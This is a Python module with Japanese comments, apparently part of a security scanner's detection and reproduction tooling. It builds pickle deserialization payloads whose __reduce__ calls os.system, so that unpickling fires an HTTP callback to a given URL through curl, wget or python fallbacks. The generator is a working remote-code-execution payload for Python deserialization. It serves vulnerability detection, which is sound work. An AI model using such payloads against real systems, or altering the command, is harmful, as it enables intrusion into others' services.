"""
OOB payload builders — SGK-2026-0496.

ブラインド/OOB デシリアライズの確認用に、デシリアライズ時に**外向き HTTP コールバック**を
発生させるペイロードを組み立てる。エンジン（検出）と封印再現チェッカー（再現）で共有し、
一意 callback URL からペイロードを再生成できるようにする（再現時は fresh callback で作り直す）。

コールバックは良性（我々の受信器への HTTP GET のみ・破壊的動作なし）。生成物は攻撃成果物
（デシリアライズ RCE ペイロード）だが、実行されるコマンドは受信器コールバックに限定する。
"""
from __future__ import annotations

import os
import pickle
from typing import Callable, Dict


class _PickleOSSystem:
    """__reduce__ で os.system(cmd) を返すだけのオブジェクト（pickle.dumps 用）。

    dumps は __reduce__ の戻り値（os.system, (cmd,)) を直列化するだけで、このクラス自体は
    ピクル化されない（unpickle 時は os.system(cmd) が復元・実行される）。"""

    def __init__(self, cmd: str) -> None:
        self._cmd = cmd

    def __reduce__(self):
        return (os.system, (self._cmd,))


def _http_callback_cmd(callback_url: str) -> str:
    """受信器へ HTTP GET する良性コマンド（curl→wget→python3→python の順にフォールバック）。"""
    cb = callback_url
    return (
        f"curl -s -m 5 '{cb}' >/dev/null 2>&1 || "
        f"wget -q -T 5 -O- '{cb}' >/dev/null 2>&1 || "
        f"python3 -c \"import urllib.request as u;u.urlopen('{cb}',timeout=5)\" >/dev/null 2>&1 || "
        f"python -c \"import urllib2;urllib2.urlopen('{cb}',timeout=5)\" >/dev/null 2>&1"
    )


def _build_python_pickle(callback_url: str) -> bytes:
    """Python pickle: unpickle 時に os.system で受信器へコールバックする。"""
    return pickle.dumps(_PickleOSSystem(_http_callback_cmd(callback_url)))


_BUILDERS: Dict[str, Callable[[str], bytes]] = {
    "python_pickle": _build_python_pickle,
}


def build_oob_payload(kind: str, callback_url: str) -> bytes:
    """kind に対応するデシリアライズ OOB ペイロード（bytes）を callback_url から生成。"""
    fn = _BUILDERS.get(kind)
    if fn is None:
        raise ValueError(f"unknown OOB payload builder: {kind}")
    return fn(callback_url)


def encode_payload(raw: bytes, encoding: str) -> "str | bytes":
    """送出用エンコード（hex / base64 / raw）。"""
    enc = (encoding or "raw").lower()
    if enc == "hex":
        return raw.hex()
    if enc == "base64":
        import base64
        return base64.b64encode(raw).decode("ascii")
    return raw
